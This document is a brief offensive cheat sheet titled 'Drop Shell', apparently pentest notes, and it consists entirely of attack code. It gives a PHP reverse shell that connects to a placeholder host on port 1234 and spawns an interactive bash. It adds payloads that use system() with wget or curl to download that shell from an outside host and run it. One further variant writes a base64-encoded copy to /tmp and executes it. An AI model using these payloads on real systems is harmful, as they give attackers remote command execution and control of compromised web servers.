# Drop Shell

shell.txt:

```php
<?php $sock=fsockopen("X.X.X.X",1234);exec("/bin/bash -i <&3 >&3 2>&3");?>
```

payload:

```php
<?php system("wget http://X.X.X.X/shell.txt -O /tmp/shell.php; php /tmp/shell.php"); ?>
<?php system("curl http://X.X.X.X/shell.txt > /tmp/shell.php; php /tmp/shell.php"); ?>

<?php system("echo \"PD9waHAgPWZzb2Nrb3BlbigiMTAuMTAuMTQuMTYiLDEyMzQpO2V4ZWMoIi9iaW4vYmFzaCAtaSA8JjMgPiYzIDI+JjMiKTs/Pgo=\" | base64 -d > /tmp/shell.php; php /tmp/shell.php"); ?>
```
